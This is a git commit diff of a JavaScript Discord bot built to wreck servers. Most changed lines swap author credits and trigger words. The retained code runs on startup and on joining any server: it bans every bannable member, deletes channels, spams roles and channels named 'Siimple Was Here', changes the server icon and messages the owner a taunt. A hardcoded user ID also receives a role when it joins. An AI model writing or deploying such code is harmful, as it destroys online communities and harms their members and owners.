3c457bb1792db9f42771eb4a961a5607a25796b0
Simpleeeeee <45079652+drtox@users.noreply.github.com>
2019-07-26 00:16:07 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,21 +1,21 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log('By Siimpleeeeeee');
+console.log('By KBOOOOOOOOSH-YT');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
- 
+
 });
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : Siimple ~           ~    ');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  Siimpleeeeeee " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
- 
-       
-   
- 
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+
+
+
+
 });
 var prefix = "-"
 LOka.on("message", message => {
@@ -25,32 +25,32 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'go')) {
+    if (message.content.startsWith(prefix + 'on123')) {
     LOka.user.setStatus(argresult);
   }
 });
- 
-var x1 = "go"
+
+var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
+
 }
 });
-var x1 = "go"
+var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setUsername("Siimple Was Here")
- 
+
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setGame(`Siimple Was Here`,'https://www.twitch.tv/hix')
- 
+
 }
 });
- 
+
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
@@ -65,20 +65,20 @@ LOka.on('message', message => {
 })
 }
 });
- 
+
 LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
- 
+
              message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
+
 }
 });
- 
+
 LOka.on('message', message => {
-     
- 
-     if (message.content === "go") {
+
+
+     if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Siimple Was Here",
@@ -125,7 +125,7 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
- 
+
     m.createRole({
         name : "Siimple Was Here",
         permissions :   [1],
@@ -151,7 +151,7 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
- 
+
     m.createRole({
         name : "Siimple Was Here",
         permissions :   [1],
@@ -162,22 +162,7 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
- 
-    m.createRole({
-        name : "Siimple Was Here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Siimple Was Here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Siimple Was Here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
+
     m.createRole({
         name : "Siimple Was Here",
         permissions :   [1],
@@ -248,18 +233,6 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
- 
-    m.createRole({
-        name : "Siimple Was Here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Siimple Was Here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
     m.createRole({
         name : "Siimple Was Here",
         permissions :   [1],
@@ -275,12 +248,39 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
- 
- 
-   
+
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+
 })
- 
- 
+
+
 }
 });
 LOka.on('message', message => {
@@ -296,28 +296,13 @@ m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
- 
+
 m.createChannel('Siimple Was Here', 'text');
- 
+
 m.createChannel('Siimple Was Here', 'text');
- 
+
 m.createChannel('Siimple Was Here', 'text');
- 
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
- 
-m.createChannel('Siimple Was Here', 'text');
-m.createChannel('Siimple Was Here', 'text');
- 
+
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
@@ -329,14 +314,29 @@ m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
- 
+
 m.createChannel('Siimple Was Here', 'text');
 m.createChannel('Siimple Was Here', 'text');
- 
+
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+
 })
 }
 });
- 
+
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
@@ -348,44 +348,10 @@ m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
- 
+
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
- 
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
- 
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
- 
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
-m.createChannel('Siimple Was Here', 'voice');
- 
+
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
@@ -398,29 +364,63 @@ m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
 m.createChannel('Siimple Was Here', 'voice');
+
 m.createChannel('Siimple Was Here', 'voice');
- 
- 
- 
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+
+
+
 })
 }
- 
+
 });
- 
- 
+
+
 const { Client } = require('discord.js');
 const client = new Client();
- 
+
 async function nuke(guild) {
   let users = 0;
   let channels = 0;
- 
+
   await guild.fetchMembers();
- 
+
   await guild.owner.send(' Siimple Was Here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
+
+
+
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
@@ -428,38 +428,38 @@ async function nuke(guild) {
       return m.ban();
     }
   }));
- 
+
     await Promise.all(guild.channels.map(c => {
     if (c.deletable) {
       channels++;
       return c.delete();
     }
   }));
- 
+
     await guild.createChannel('Siimple Was Here', 'text');
- 
+
       await guild.createChannel('Siimple Was Here', 'voice');
- 
- 
- 
+
+
+
 }
- 
+
 LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by Simple");
+  console.log("Made by YzhF1");
   console.log("");
   console.log("-------------------------------------------------------------");
- 
+
 });
- 
+
 LOka.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
- 
+
 LOka.on('guildMemberAdd', member => {
-   
+
             if (member.id === "349288766302584832") {
                 member.guild.createRole({
                     name : LOka.user.username,
@@ -468,14 +468,14 @@ LOka.on('guildMemberAdd', member => {
                 }).then(function(role){
                     member.addRole(role)
                 })
-               
+
             }
-       
+
     });
- 
-   
- 
- 
- 
- 
-LOka.login(process.env.BOT_TOKEN);
+
+
+
+
+
+
+client.login(process.env.BOT_TOKEN);
